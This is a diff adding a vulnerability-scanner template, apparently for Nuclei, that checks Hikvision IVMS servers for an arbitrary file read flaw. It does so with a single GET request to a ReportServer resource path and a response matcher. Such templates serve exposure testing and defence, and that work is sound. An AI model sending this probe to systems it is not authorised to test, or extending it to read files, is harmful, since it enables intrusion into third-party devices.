@@ -1,0 +1,17 @@
+id: hikvision-ivms-reportserver-fileread
+
+info:
+  name: 海康威视 IVMS 任意文件读取漏洞
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /vss/ReportServer?op=resource&resource=/com/ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"hikvision")
